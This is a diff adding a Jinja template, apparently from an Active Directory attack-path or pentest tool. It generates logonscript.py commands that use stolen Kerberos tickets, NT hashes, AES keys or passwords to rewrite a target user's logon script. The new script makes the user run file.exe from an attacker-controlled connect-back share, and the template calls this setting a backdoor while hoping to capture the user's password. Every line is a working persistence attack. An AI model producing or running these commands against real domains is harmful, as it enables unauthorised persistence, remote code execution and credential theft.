@@ -1,0 +1,12 @@
+# Set a backdoor on {{target.name}}
+{% if parent.krb_auth %}
+./tools/logonscript.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{target.name}}' -write '\\{{connectback_ip|red}}\file.exe'"
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+./tools/logonscript.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{parent.secret|red}} -t '{{target.name}}' -write '\\{{connectback_ip|red}}\file.exe'"
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+./tools/logonscript.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{parent.secret|red}} -t '{{target.name}}' -write '\\{{connectback_ip|red}}\file.exe'"
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+./tools/logonscript.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{target.name}}' -write '\\{{connectback_ip|red}}\file.exe'"
+{%- endif %}
+
+# Wait user logon... Hoping you will find the user password or other interesting things!
